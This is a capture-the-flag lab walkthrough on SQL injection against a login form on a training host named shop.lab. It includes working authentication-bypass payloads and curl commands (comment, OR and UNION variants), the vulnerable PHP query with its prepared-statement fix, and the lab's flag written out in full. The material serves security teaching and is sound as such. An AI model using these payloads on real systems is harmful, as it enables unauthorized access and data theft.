# Lab 2.1: Basic SQL Injection (Login)

## Learning Objectives
- Understand SQL injection vulnerabilities in authentication systems
- Identify SQL injection in login forms
- Exploit basic SQL injection to bypass authentication
- Access user dashboard and extract sensitive information
- Capture the flag

## What is SQL Injection?

SQL Injection is a vulnerability that occurs when user input is directly concatenated into SQL queries without proper sanitization. This allows attackers to manipulate the SQL query structure, potentially bypassing authentication, accessing unauthorized data, or modifying the database.

### Common SQL Injection Attack Vectors

1. **Authentication Bypass**: Manipulating login queries to bypass password checks
2. **Data Extraction**: Using UNION queries to extract sensitive information
3. **Database Manipulation**: Modifying or deleting data
4. **Privilege Escalation**: Gaining access to administrative accounts

## Solution Walkthrough

### Step 1: Add Hostname to /etc/hosts

Add the required hostname to your `/etc/hosts` file to resolve the domain name.

**Detailed Steps:**

1. **Open the hosts file:**
   ```bash
   sudo nano /etc/hosts
   ```

2. **Add the hostname mapping** (replace `<target_ip>` with the IP shown in the lab panel):
   ```bash
   <target_ip>    shop.lab
   ```

3. **Save and verify:**
   ```bash
   cat /etc/hosts | grep lab
   ```

   **Expected output:**
   ```
   <target_ip>    shop.lab
   ```

### Step 2: Access the Login Page

Access the web application to see the login form.

**Detailed Steps:**

1. **Access the main page:**
   ```bash
   curl http://shop.lab/
   ```

   Or open in your browser: `http://shop.lab`

2. **What you should see:**
   - A login form with "Username" and "Password" fields
   - A "Login" button
   - The page title "ShopSecure - Employee Portal"

3. **Try a normal login (this should fail):**
   ```bash
   curl -X POST http://shop.lab/ \
     -d "username=test&password=test" \
     -L
   ```

   **Expected result:** Error message "Invalid username or password"

**What to observe:**
- The application uses a POST request for login
- Username and password are sent as form data
- This is a typical authentication form that may be vulnerable to SQL injection

### Step 3: Test for SQL Injection

Test if the login form is vulnerable to SQL injection by injecting SQL syntax.

**Understanding the Vulnerable Query:**

The application likely uses a query like:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

If we can manipulate this query, we can bypass authentication.

**Detailed Steps:**

1. **Test with SQL comment to bypass password (classic SQL injection):**
   ```bash
   curl -X POST http://shop.lab/ \
     -d "username=admin' --&password=anything" \
     -L
   ```

   **What this does:**
   - `admin'` - Closes the username string
   - `--` - SQL comment that ignores everything after it
   - The query becomes: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'`
   - The `--` comments out the password check, allowing login as admin

   **Expected result:** You should be logged in as admin and see the dashboard!

2. **Alternative: Use OR condition:**
   ```bash
   curl -X POST http://shop.lab/ \
     -d "username=admin' OR '1'='1&password=anything" \
     -L
   ```

   **What this does:**
   - Makes the WHERE clause always true: `username = 'admin' OR '1'='1' AND password = 'anything'`
   - This may return the first user in the database

3. **Test in browser (recommended for better visualization):**
   - Navigate to: `http://shop.lab`
   - In the username field, enter: `admin' --`
   - In the password field, enter: `anything` (or leave blank)
   - Click "Login"

   **Expected result:** You should see the admin dashboard!

### Step 4: Access the Dashboard

Once you successfully bypass authentication, you'll see the user dashboard.

**What the Dashboard Shows:**

- Welcome message with user's full name
- Username
- Email address
- Role (user or admin)
- User ID
- **Flag** (if the user has one - admin user has the flag)

**Detailed Steps:**

1. **After successful SQL injection login, you should see:**
   ```
   Welcome, Administrator!
   
   Username: admin
   Email: admin@shopsecure.local
   Role: admin
   User ID: 1
   
   🚩 Flag: OCR{sql_1nj3ct10n_g3t_b4s1c}
   ```

2. **If you used curl, view the full response:**
   ```bash
   curl -X POST http://shop.lab/ \
     -d "username=admin' --&password=anything" \
     -L -s | grep -A 5 "Flag"
   ```

3. **Alternative payloads to try:**
   ```bash
   # Bypass with OR condition
   curl -X POST http://shop.lab/ \
     -d "username=' OR '1'='1'--&password=anything" \
     -L
   
   # Bypass with UNION (if you know the table structure)
   curl -X POST http://shop.lab/ \
     -d "username=admin' UNION SELECT 1,'admin','admin@test.com','Admin','admin','OCR{flag}'--&password=anything" \
     -L
   ```

### Step 5: Extract the Flag

The flag is displayed on the admin user's dashboard after successful login.

**Flag:**
```
OCR{sql_1nj3ct10n_g3t_b4s1c}
```

**Detailed Steps:**

1. **Using SQL injection, log in as admin:**
   - Username: `admin' --`
   - Password: `anything`

2. **View the dashboard:**
   - The flag will be displayed in a green box on the dashboard
   - Format: `🚩 Flag: OCR{sql_1nj3ct10n_g3t_b4s1c}`

3. **Verify flag format:**
   - Starts with `OCR{`
   - Ends with `}`
   - Contains only alphanumeric characters and underscores

### Step 6: Understand the Vulnerability

**The Vulnerable Code:**

The application uses direct string concatenation:
```php
$query = "SELECT * FROM users WHERE username = '" . $username . "' AND password = '" . $password . "'";
```

**Why This is Vulnerable:**

1. **No Input Sanitization**: User input is directly inserted into the SQL query
2. **No Prepared Statements**: The query is built using string concatenation
3. **No Input Validation**: Special characters like quotes are not escaped

**How the Attack Works:**

1. Attacker enters: `admin' --` as username
2. The query becomes: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'`
3. The `--` comments out the password check
4. The query matches the admin user
5. Attacker is logged in as admin without knowing the password

**Secure Alternatives:**

1. **Use Prepared Statements:**
   ```php
   $stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
   $stmt->bind_param("ss", $username, $password);
   $stmt->execute();
   ```

2. **Input Validation:**
   - Whitelist allowed characters
   - Escape special characters
   - Use parameterized queries

3. **Password Hashing:**
   - Store hashed passwords (not plaintext)
   - Use secure hashing algorithms (bcrypt, argon2)

## Common SQL Injection Payloads

### Authentication Bypass

```bash
# Classic comment-based bypass
username: admin' --
password: anything

# OR condition bypass
username: ' OR '1'='1'--
password: anything

# UNION-based (if you know table structure)
username: admin' UNION SELECT 1,'admin','admin@test.com','Admin','admin','FLAG'--
password: anything
```

### Testing for Vulnerability

```bash
# Test with single quote (should cause error)
username: admin'
password: test

# Test with double dash (should bypass)
username: admin' --
password: test

# Test with OR condition
username: ' OR '1'='1
password: test
```

## Troubleshooting

### "Invalid username or password" After Injection

**Possible causes:**
- The payload syntax is incorrect
- The application has some input filtering (unlikely in this lab)
- The SQL syntax doesn't match the database

**Solutions:**
- Try different payload variations
- Ensure the quote and comment are correct: `admin' --`
- Try URL encoding: `admin%27--%20`

### Can't See the Dashboard

**Solutions:**
- Use a browser instead of curl for better visualization
- Check if the response contains HTML with the dashboard
- Look for the flag in the HTML source

### Flag Not Displayed

**Solutions:**
- Ensure you logged in as the admin user (not a regular user)
- Check the dashboard HTML for the flag
- The flag should be in a green box on the admin dashboard

## Success Criteria

- ✅ Successfully added hostname to /etc/hosts
- ✅ Accessed the login page
- ✅ Identified SQL injection vulnerability in login form
- ✅ Successfully bypassed authentication using SQL injection
- ✅ Accessed the admin dashboard
- ✅ Retrieved the flag from the dashboard
- ✅ Verified flag format is correct: `OCR{...}`

## Key Takeaways

### What You Learned

1. **SQL Injection in Authentication**: How login forms can be vulnerable
2. **Authentication Bypass**: Using SQL comments to bypass password checks
3. **Real-World Impact**: Understanding how this vulnerability can lead to unauthorized access
4. **Secure Coding**: Importance of prepared statements and input validation

### Real-World Implications

- **Unauthorized Access**: Attackers can log in as any user without knowing passwords
- **Data Breach**: Access to sensitive user information
- **Privilege Escalation**: Gaining admin access to systems
- **Compliance Violations**: GDPR, HIPAA violations from unauthorized access

### Prevention

1. **Always use prepared statements** for database queries
2. **Validate and sanitize** all user input
3. **Use parameterized queries** instead of string concatenation
4. **Implement proper authentication** with password hashing
5. **Regular security testing** and code reviews

## Further Reading

- OWASP: SQL Injection
- OWASP: Authentication Cheat Sheet
- SQL Injection Prevention Cheat Sheet
- Prepared Statements Best Practices

## Common Mistakes

- ❌ Not escaping quotes in payloads
- ❌ Forgetting the comment (`--`) to ignore password check
- ❌ Using wrong SQL syntax
- ❌ Not testing in browser to see full dashboard
- ❌ Trying to access flag before successful login

## Hints

1. The vulnerability is in the login form, not GET parameters
2. Try using a single quote and SQL comment to bypass authentication
3. The admin user has the flag in their profile
4. Classic SQL injection payload: `admin' --`
5. The flag is displayed on the dashboard after successful login
